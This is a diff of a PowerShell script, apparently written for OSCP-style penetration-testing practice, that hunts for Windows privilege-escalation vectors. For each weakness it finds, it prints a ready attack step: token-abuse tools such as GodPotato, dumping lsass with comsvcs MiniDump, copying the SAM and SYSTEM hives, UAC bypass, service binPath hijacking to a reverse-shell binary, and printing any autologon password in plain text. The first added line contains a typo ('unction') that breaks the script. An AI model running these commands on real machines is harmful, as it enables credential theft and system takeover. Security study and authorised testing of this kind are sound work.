@@ -1,14 +1,30 @@
-function Invoke-ServiceAudit {
-    Write-Host "`n==================================================================" -ForegroundColor Cyan
-    Write-Host "[*] WINDOWS PRIVESC VECTOR HUNTER (SERVICES, PATH, TASKS, AUTORUN)" -ForegroundColor Cyan
-    Write-Host "==================================================================" -ForegroundColor Cyan
+unction Invoke-OSCPPrivEscAudit {
+    Write-Host "`n======================================================================" -ForegroundColor Cyan
+    Write-Host "[*] OSCP WINDOWS PRIVESC HUNTER v4 (CONFIRMED VECTORS FIRST)" -ForegroundColor Cyan
+    Write-Host "======================================================================" -ForegroundColor Cyan
 
-    # 1. Collect all SIDs of current user + groups
     $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object System.Security.Principal.WindowsPrincipal($id)
+    $isAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
     $mySids = New-Object System.Collections.Generic.HashSet[string]
     [void]$mySids.Add($id.User.Value)
-    foreach ($g in $id.Groups) { [void]$mySids.Add($g.Value) }
-    Write-Host "[i] User: $($id.Name) | Checking ACLs against all $($mySids.Count) token SIDs...`n" -ForegroundColor Gray
+    $groupNames = @()
+    foreach ($g in $id.Groups) {
+        [void]$mySids.Add($g.Value)
+        try { $groupNames += $g.Translate([System.Security.Principal.NTAccount]).Value } catch {}
+    }
+
+    Write-Host "[i] User: $($id.Name) | Elevated Admin: $isAdmin | Groups: $($mySids.Count)" -ForegroundColor Gray
+
+    $confirmedVectors = New-Object System.Collections.Generic.List[PSCustomObject]
+    function Add-Vector($Category, $Title, $Trigger, $NextStep) {
+        $confirmedVectors.Add([PSCustomObject]@{
+            Category = $Category
+            Vector   = $Title
+            Trigger  = $Trigger
+            NextStep = $NextStep
+        })
+    }
 
     function Get-CleanExePath($rawPath) {
         if (-not $rawPath) { return "" }
@@ -71,7 +87,56 @@ function Invoke-ServiceAudit {
         return $result
     }
 
-    # 2. Load services (CIM -> WMI -> Registry fallback)
+    # 1. CHECK TOKEN PRIVILEGES & SPECIAL GROUPS
+    $privOut = whoami.exe /priv 2>$null
+    $hasShutdown = $false
+    if ($privOut) {
+        if ($privOut -match "SeShutdownPrivilege")          { $hasShutdown = $true }
+        if ($privOut -match "SeImpersonatePrivilege")       { Add-Vector "TOKEN" "SeImpersonatePrivilege" "Immediate" "Run GodPotato / PrintSpoofer / JuicyPotatoNG" }
+        if ($privOut -match "SeAssignPrimaryTokenPrivilege"){ Add-Vector "TOKEN" "SeAssignPrimaryTokenPrivilege" "Immediate" "Run GodPotato / PrintSpoofer" }
+        if ($privOut -match "SeBackupPrivilege")            { Add-Vector "TOKEN" "SeBackupPrivilege" "Immediate" "robocopy /B C:\Windows\System32\config C:\Windows\Temp SAM SYSTEM" }
+        if ($privOut -match "SeRestorePrivilege")           { Add-Vector "TOKEN" "SeRestorePrivilege" "Immediate" "Overwrite service binary or Utilman.exe with backup semantics" }
+        if ($privOut -match "SeTakeOwnershipPrivilege")     { Add-Vector "TOKEN" "SeTakeOwnershipPrivilege" "Immediate" "takeown /f <target> && icacls <target> /grant $($env:USERNAME):(F)" }
+        if ($privOut -match "SeDebugPrivilege")             { Add-Vector "TOKEN" "SeDebugPrivilege" "Immediate" "Dump lsass.exe via comsvcs.dll MiniDump" }
+        if ($privOut -match "SeManageVolumePrivilege")      { Add-Vector "TOKEN" "SeManageVolumePrivilege" "Immediate" "Use SeManageVolume exploit to enable arbitrary write in C:\" }
+        if ($privOut -match "SeLoadDriverPrivilege")        { Add-Vector "TOKEN" "SeLoadDriverPrivilege" "Immediate" "Load vulnerable kernel driver (Capcom.sys / EoPLoadDriver)" }
+    }
+
+    if (($groupNames -match "Administrators") -and (-not $isAdmin)) {
+        Add-Vector "UAC" "User is in Administrators (Medium Integrity)" "Immediate" "Run UAC Bypass (fodhelper.exe registry key or SystemPropertiesAdvanced.exe DLL)"
+    }
+    foreach ($specialGroup in @("Backup Operators", "DnsAdmins", "Print Operators", "Server Operators", "Hyper-V Administrators", "LAPS_Readers")) {
+        if ($groupNames -match [regex]::Escape($specialGroup)) {
+            Add-Vector "GROUP" "Member of privileged group: $specialGroup" "Immediate" "Check group-specific abuse in checklist"
+        }
+    }
+
+    # 2. CHECK REGISTRY POLICIES (AlwaysInstallElevated, AutoLogon, Creds, SAM)
+    $aieHKCU = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
+    $aieHKLM = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
+    if ($aieHKCU -eq 1 -and $aieHKLM -eq 1) {
+        Add-Vector "REGISTRY" "AlwaysInstallElevated = 1 (Both HKCU & HKLM)" "Immediate" "msiexec /quiet /qn /i C:\Windows\Temp\rev.msi"
+    }
+
+    $winlogon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
+    if ($winlogon -and $winlogon.DefaultPassword) {
+        Add-Vector "CREDENTIAL" "Winlogon AutoLogon Password Found!" "Immediate" "User: $($winlogon.DefaultUserName) | Pass: $($winlogon.DefaultPassword)"
+    }
+
+    $cmdkeyOut = cmdkey.exe /list 2>$null
+    if ($cmdkeyOut -and ($cmdkeyOut -notmatch "NONE" -and $cmdkeyOut -match "Target:")) {
+        Add-Vector "CREDENTIAL" "Saved Credentials in cmdkey /list" "Immediate" "Use: runas.exe /savecred /user:<TargetUser> C:\Windows\Temp\rev.exe"
+    }
+
+    if (Test-Path "C:\Windows\System32\config\SAM") {
+        try {
+            $samStream = [IO.File]::OpenRead("C:\Windows\System32\config\SAM")
+            $samStream.Close()
+            Add-Vector "CVE" "SAM file is directly readable!" "Immediate" "Copy SAM & SYSTEM or run HiveNightmare.exe (Shadow Copies)"
+        } catch {}
+    }
+
+    # 3. CHECK SERVICES (ONLY CONFIRMED WRITABLE VECTORS GO TO TOP)
     $services = @()
     try {
         $services = Get-CimInstance Win32_Service -ErrorAction Stop | Select-Object Name, DisplayName, State, StartMode, StartName, PathName
@@ -95,7 +160,6 @@ function Invoke-ServiceAudit {
         }
     }
 
-    $foundCount = 0
     $customApps = @()
 
     foreach ($svc in $services) {
@@ -118,11 +182,24 @@ function Invoke-ServiceAudit {
             }
         }
 
-        # Check Unquoted Service Path (spaces before .exe and no quotes)
         $isQuoted = $raw.StartsWith('"')
         $hasSpaces = $exePath -match '\s'
         $isUnquoted = (-not $isQuoted) -and $hasSpaces
-        $unquotedTargets = @()
+
+        $trig = if ($dacl.CanStartStop) { "sc.exe stop $($svc.Name) && sc.exe start $($svc.Name)" }
+                elseif ($svc.StartMode -eq "Auto" -and $hasShutdown) { "Auto-Start + SeShutdown Enabled (Reboot via WMI Win32Shutdown(6))" }
+                elseif ($svc.StartMode -eq "Auto") { "Auto-Start (Reboot needed)" }
+                else { "Manual ($($svc.StartMode))" }
+
+        if ($dacl.CanChangeConfig) {
+            Add-Vector "SERVICE" "$($svc.Name) (Weak Service DACL | RunAs: $($svc.StartName))" $trig "sc.exe config `"$($svc.Name)`" binPath= `"C:\Windows\Temp\rev.exe`""
+        }
+        if ($regWritable) {
+            Add-Vector "SERVICE" "$($svc.Name) (Writable Registry Key | RunAs: $($svc.StartName))" $trig "Set-ItemProperty `"$regPath`" -Name ImagePath -Value `"C:\Windows\Temp\rev.exe`""
+        }
+        if ($exeWritable) {
+            Add-Vector "SERVICE" "$($svc.Name) (Writable .exe Binary | RunAs: $($svc.StartName))" $trig "copy /Y C:\Windows\Temp\rev.exe `"$exePath`""
+        }
 
         if ($isUnquoted -and $exePath -match '^[A-Za-z]:\\') {
             $parts = $exePath.Split('\')
@@ -132,12 +209,14 @@ function Invoke-ServiceAudit {
                 if ($parts[$i + 1] -match '\s') {
                     $cand = "$curr\" + (($parts[$i + 1] -split '\s+')[0]) + ".exe"
                     if (Test-MyAclWrite ($curr + "\")) {
-                        $unquotedTargets += "[WRITABLE!] $cand"
-                    } else {
-                        $unquotedTargets += "[Read-Only] $cand"
+                        Add-Vector "UNQUOTED" "$($svc.Name) (Writable Unquoted Path | RunAs: $($svc.StartName))" $trig "Drop payload at: `"$cand`""
                     }
                 }
             }
+        }
+
+        if ($appDirWritable) {
+            Add-Vector "DLL/DIR" "$($svc.Name) (Writable Service Dir | RunAs: $($svc.StartName))" $trig "Writable folder: `"$parentDir`" (check missing DLLs / configs)"
         }
 
         if ($isCustom) {
@@ -149,78 +228,24 @@ function Invoke-ServiceAudit {
                 PathName  = $svc.PathName
             }
         }
-
-        # Only print this service if it has at least one finding!
-        if ($dacl.CanChangeConfig -or $regWritable -or $exeWritable -or $appDirWritable -or $isUnquoted) {
-            $foundCount++
-            $trig = if ($dacl.CanStartStop) { "sc.exe stop $($svc.Name) && sc.exe start $($svc.Name)" }
-                    elseif ($svc.StartMode -eq "Auto") { "Auto-Start (Reboot machine via WMI/SeShutdown)" }
-                    else { "Manual ($($svc.StartMode) - need trigger)" }
-
-            Write-Host "[!] SERVICE FINDING: $($svc.Name) ($($svc.DisplayName))" -ForegroundColor Red
-            Write-Host "    State / Mode : $($svc.State) | StartMode: $($svc.StartMode) | RunAs: $($svc.StartName)" -ForegroundColor White
-            Write-Host "    Binary Path  : $($svc.PathName)" -ForegroundColor Gray
-            Write-Host "    How to Start : $trig" -ForegroundColor Cyan
-
-            if ($dacl.CanChangeConfig) {
-                Write-Host "    [+] WEAK SERVICE DACL (accesschk): You can change service config!" -ForegroundColor Green
-                Write-Host "        Action -> sc.exe config `"$($svc.Name)`" binPath= `"C:\Windows\Temp\rev.exe`"" -ForegroundColor Yellow
-            }
-            if ($regWritable) {
-                Write-Host "    [+] WEAK REGISTRY ACL: You can overwrite ImagePath in Registry!" -ForegroundColor Green
-                Write-Host "        Action -> reg add `"HKLM\SYSTEM\CurrentControlSet\Services\$($svc.Name)`" /v ImagePath /t REG_EXPAND_SZ /d `"C:\Windows\Temp\rev.exe`" /f" -ForegroundColor Yellow
-            }
-            if ($exeWritable) {
-                Write-Host "    [+] WEAK BINARY ACL (icacls): You can overwrite the service .exe!" -ForegroundColor Green
-                Write-Host "        Action -> copy /Y C:\Windows\Temp\rev.exe `"$exePath`"" -ForegroundColor Yellow
-            }
-            if ($isUnquoted) {
-                Write-Host "    [+] UNQUOTED SERVICE PATH DETECTED:" -ForegroundColor Green
-                foreach ($u in $unquotedTargets) {
-                    $color = if ($u -match '^\[WRITABLE') { "Yellow" } else { "DarkGray" }
-                    Write-Host "        Candidate -> $u" -ForegroundColor $color
-                }
-            }
-            if ($appDirWritable) {
-                Write-Host "    [+] WRITABLE SERVICE FOLDER (icacls): $parentDir" -ForegroundColor Green
-                Write-Host "        Action -> Possible DLL Hijacking or config replacement in $parentDir" -ForegroundColor Yellow
-            }
-            Write-Host ""
-        }
     }
 
-    if ($foundCount -eq 0) {
-        Write-Host "[-] No vulnerable services (Unquoted / Weak DACL / Weak File or Reg ACL) found." -ForegroundColor Yellow
-    }
-
-    # 3. Check %PATH% folders for Write access (DLL Hijacking / Binary planting)
-    Write-Host "------------------------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "[*] CHECKING %PATH% FOLDERS FOR WRITE PERMISSIONS (icacls)..." -ForegroundColor Cyan
-    $writablePathDirs = @()
+    # 4. CHECK %PATH%, STARTUP, AUTORUNS & SCHEDULED TASKS
     ($env:Path -split ';') | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -Unique | ForEach-Object {
         if (Test-MyAclWrite $_) {
-            $writablePathDirs += $_
-            Write-Host "    [+] WRITABLE %PATH% FOLDER: $_" -ForegroundColor Green
+            Add-Vector "PATH" "Writable Folder in System %PATH%" "DLL Hijack / AutoElevate" "Folder: `"$_`""
         }
     }
-    if ($writablePathDirs.Count -eq 0) {
-        Write-Host "    [-] No writable folders in %PATH%." -ForegroundColor DarkGray
-    }
 
-    # 4. Check Autorun / Startup folders & binaries
-    Write-Host "------------------------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "[*] CHECKING STARTUP FOLDERS & AUTORUN KEYS (icacls)..." -ForegroundColor Cyan
-    $startupFound = $false
     $commonStartup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
     if (Test-MyAclWrite $commonStartup) {
-        $startupFound = $true
-        Write-Host "    [+] WRITABLE ALL-USERS STARTUP FOLDER: $commonStartup" -ForegroundColor Green
+        Add-Vector "STARTUP" "Writable All-Users StartUp Folder" "Admin Logon" "Drop payload in: `"$commonStartup`""
     }
+
     foreach ($rk in @("HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce", "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run")) {
         if (Test-Path $rk) {
             if (Test-MyAclWrite $rk -IsRegistry) {
-                $startupFound = $true
-                Write-Host "    [+] WRITABLE AUTORUN REGISTRY KEY: $rk" -ForegroundColor Green
+                Add-Vector "AUTORUN" "Writable Autorun Registry Key" "Admin Logon" "Key: $rk"
             }
             $props = Get-ItemProperty $rk -ErrorAction SilentlyContinue
             if ($props) {
@@ -228,22 +253,14 @@ function Invoke-ServiceAudit {
                     if ($p.Name -notmatch '^PS') {
                         $exe = Get-CleanExePath "$($p.Value)"
                         if ($exe -and (Test-Path -LiteralPath $exe) -and (Test-MyAclWrite $exe)) {
-                            $startupFound = $true
-                            Write-Host "    [+] WRITABLE AUTORUN BINARY ($($p.Name)): $exe" -ForegroundColor Green
+                            Add-Vector "AUTORUN" "Writable Autorun Binary ($($p.Name))" "Admin Logon" "Overwrite: `"$exe`""
                         }
                     }
                 }
             }
         }
     }
-    if (-not $startupFound) {
-        Write-Host "    [-] No writable Startup folders or Autorun binaries." -ForegroundColor DarkGray
-    }
 
-    # 5. Check Custom Scheduled Tasks for writable scripts/binaries
-    Write-Host "------------------------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "[*] CHECKING CUSTOM SCHEDULED TASKS FOR WRITABLE BINARIES..." -ForegroundColor Cyan
-    $taskFound = $false
     try {
         Get-ScheduledTask -ErrorAction Stop | Where-Object { $_.TaskPath -notlike '\Microsoft*' -and $_.State -ne 'Disabled' } | ForEach-Object {
             $tName = $_.TaskName
@@ -253,24 +270,65 @@ function Invoke-ServiceAudit {
                 if ($exe -and (Test-Path -LiteralPath $exe)) {
                     $dir = Split-Path -Parent $exe
                     if ((Test-MyAclWrite $exe) -or ($dir -and (Test-MyAclWrite $dir))) {
-                        $taskFound = $true
-                        Write-Host "    [+] WRITABLE SCHEDULED TASK: $tName (RunAs: $runAs)" -ForegroundColor Green
-                        Write-Host "        Target -> $($act.Execute) $($act.Arguments)" -ForegroundColor Yellow
+                        Add-Vector "TASK" "Writable Scheduled Task: $tName (RunAs: $runAs)" "Scheduled Trigger" "Target: $($act.Execute) $($act.Arguments)"
                     }
                 }
             }
         }
     } catch {}
-    if (-not $taskFound) {
-        Write-Host "    [-] No writable custom Scheduled Tasks found." -ForegroundColor DarkGray
+
+    # 5. CHECK POWERSHELL HISTORY FILES (NON-EMPTY)
+    Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue | ForEach-Object {
+        if ($_.Length -gt 0) {
+            Add-Vector "HISTORY" "Non-empty PSReadLine History Found!" "Immediate" "Read file: type `"$($_.FullName)`""
+        }
     }
 
-    # 6. Compact summary of installed 3rd-party services (just 1 line per service)
-    Write-Host "------------------------------------------------------------------" -ForegroundColor DarkGray
+    # OUTPUT: 1. READY PRIVESC VECTORS (THE MAIN VERDICT)
+    Write-Host "`n======================================================================" -ForegroundColor Red
+    Write-Host "[!!!] CONFIRMED PRIVESC VECTORS (READY TO EXPLOIT): $($confirmedVectors.Count)" -ForegroundColor Red
+    Write-Host "======================================================================" -ForegroundColor Red
+
+    if ($confirmedVectors.Count -gt 0) {
+        $i = 1
+        foreach ($v in $confirmedVectors) {
+            Write-Host "`n[$i] [$($v.Category)] $($v.Vector)" -ForegroundColor Green
+            Write-Host "    Trigger   : $($v.Trigger)" -ForegroundColor Cyan
+            Write-Host "    Next Step : $($v.NextStep)" -ForegroundColor Yellow
+            $i++
+        }
+    } else {
+        Write-Host "[-] No direct automated vectors confirmed. Check 3rd-party apps & localhost ports below." -ForegroundColor Yellow
+    }
+
+    # OUTPUT: 2. COMPACT CONTEXT (3RD-PARTY SERVICES & LOCALHOST PORTS)
+    Write-Host "`n----------------------------------------------------------------------" -ForegroundColor DarkGray
     Write-Host "[i] Installed 3rd-Party Services (outside C:\Windows): $($customApps.Count)" -ForegroundColor Cyan
     if ($customApps.Count -gt 0) {
         $customApps | Format-Table Service, State, StartMode, RunAs, PathName -AutoSize -Wrap
     }
+
+    $localPorts = @()
+    try {
+        $netstat = netstat.exe -ano | Select-String "LISTENING" | Select-String "127\.0\.0\.1:"
+        foreach ($line in $netstat) {
+            $tokens = ($line.ToString().Trim() -split '\s+')
+            if ($tokens.Count -ge 5) {
+                $addr = $tokens[1]
+                $pidNum = $tokens[4]
+                $proc = Get-Process -Id $pidNum -ErrorAction SilentlyContinue
+                $pName = if ($proc) { $proc.ProcessName } else { "Unknown" }
+                if ($pName -notin @("System", "svchost", "lsass", "wininit", "services")) {
+                    $localPorts += [PSCustomObject]@{ Address = $addr; PID = $pidNum; Process = $pName }
+                }
+            }
+        }
+    } catch {}
+
+    if ($localPorts.Count -gt 0) {
+        Write-Host "[i] Interesting Localhost-Only (127.0.0.1) Ports:" -ForegroundColor Cyan
+        $localPorts | Format-Table Address, PID, Process -AutoSize
+    }
 }
 
-Invoke-ServiceAudit
+Invoke-OSCPPrivEscAudit
